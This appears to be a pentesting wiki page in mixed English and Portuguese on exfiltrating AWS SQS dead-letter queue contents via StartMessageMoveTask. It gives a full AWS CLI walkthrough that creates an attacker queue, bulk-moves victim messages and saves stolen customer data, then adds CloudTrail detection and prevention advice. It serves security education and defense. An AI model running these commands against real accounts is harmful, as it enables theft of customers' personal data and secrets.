# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## Description

Abuse SQS message move tasks to steal all accumulated messages from a victim's Dead-Letter Queue (DLQ) by redirecting them to an attacker-controlled queue using `sqs:StartMessageMoveTask`. This technique exploits AWS's legitimate message recovery feature to exfiltrate sensitive data that has accumulated in DLQs over time.

## What is a Dead-Letter Queue (DLQ)?

Uma Dead-Letter Queue é uma fila SQS especial onde mensagens são enviadas automaticamente quando falham ao serem processadas pela aplicação principal. Essas mensagens com falha frequentemente contêm:
- Dados sensíveis da aplicação que não puderam ser processados
- Detalhes de erro e informações de debug
- Informações Pessoais Identificáveis (PII)
- Tokens de API, credenciais ou outros segredos
- Dados de transações críticos para o negócio

DLQs atuam como um "cemitério" para mensagens com falha, tornando-as alvos valiosos, já que acumulam dados sensíveis ao longo do tempo que as aplicações não conseguiram processar corretamente.

## Attack Scenario

**Real-world example:**
1. **E-commerce application** processes customer orders through SQS
2. **Some orders fail** (payment issues, inventory problems, etc.) and get moved to a DLQ
3. **DLQ accumulates** weeks/months of failed orders containing customer data: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **Attacker gains access** to AWS credentials with SQS permissions
5. **Attacker discovers** the DLQ contains thousands of failed orders with sensitive data
6. **Instead of trying to access individual messages** (slow and obvious), attacker uses `StartMessageMoveTask` to bulk transfer ALL messages to their own queue
7. **Attacker extracts** all historical sensitive data in one operation

## Requirements
- The source queue must be configured as a DLQ (referenced by at least one queue RedrivePolicy).
- IAM permissions (run as the compromised victim principal):
- On DLQ (source): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- On destination queue: permission to deliver messages (e.g., queue policy allowing `sqs:SendMessage` from the victim principal). For same-account destinations this is typically allowed by default.
- If SSE-KMS is enabled: on source CMK `kms:Decrypt`, and on destination CMK `kms:GenerateDataKey`, `kms:Encrypt`.

## Impact
Exfiltrar payloads sensíveis acumulados em DLQs (eventos com falha, PII, tokens, payloads de aplicação) em alta velocidade usando APIs nativas do SQS. Funciona cross-account se a política da fila de destino permitir `SendMessage` a partir do principal da vítima.

## How to Abuse

- Identificar o ARN do DLQ da vítima e garantir que ele esteja realmente referenciado como DLQ por alguma fila (qualquer fila serve).
- Criar ou escolher uma fila de destino controlada pelo atacante e obter seu ARN.
- Iniciar uma message move task do DLQ da vítima para sua fila de destino.
- Monitorar o progresso ou cancelar se necessário.

### CLI Example: Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: An attacker has compromised AWS credentials and discovered that an e-commerce application uses SQS with a DLQ containing failed customer order processing attempts.

1) **Discover and examine the victim DLQ**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Criar attacker-controlled fila de destino**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Execute o roubo em massa de mensagens**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Coletar os dados sensíveis roubados**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Observações sobre contas cruzadas
- A fila de destino deve ter uma política de recurso permitindo que o principal da vítima execute `sqs:SendMessage` (e, se usado, KMS grants/permissions).

## Por que este ataque é eficaz

1. **Funcionalidade legítima da AWS**: Usa funcionalidades integradas da AWS, tornando difícil detectar como malicioso
2. **Operação em lote**: Transfere milhares de mensagens rapidamente ao invés de acesso individual lento
3. **Dados históricos**: DLQs acumulam dados sensíveis ao longo de semanas/meses
4. **Fora do radar**: Muitas organizações não monitoram de perto o acesso às DLQs
5. **Capaz entre contas**: Pode exfiltrar para a própria conta AWS do atacante se as permissões permitirem

## Detecção e Prevenção

### Detecção
Monitore o CloudTrail por chamadas API suspeitas `StartMessageMoveTask`:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Prevenção
1. **Princípio do menor privilégio**: Restringir permissões `sqs:StartMessageMoveTask` apenas aos roles necessários
2. **Monitorar DLQs**: Configurar alarmes do CloudWatch para atividade incomum nas DLQs
3. **Políticas entre contas**: Revisar cuidadosamente as políticas da fila SQS que permitem acesso entre contas
4. **Criptografar DLQs**: Usar SSE-KMS com políticas de chave restritas
5. **Limpeza regular**: Não permitir que dados sensíveis se acumulem nas DLQs indefinidamente

{{#include ../../../banners/hacktricks-training.md}}
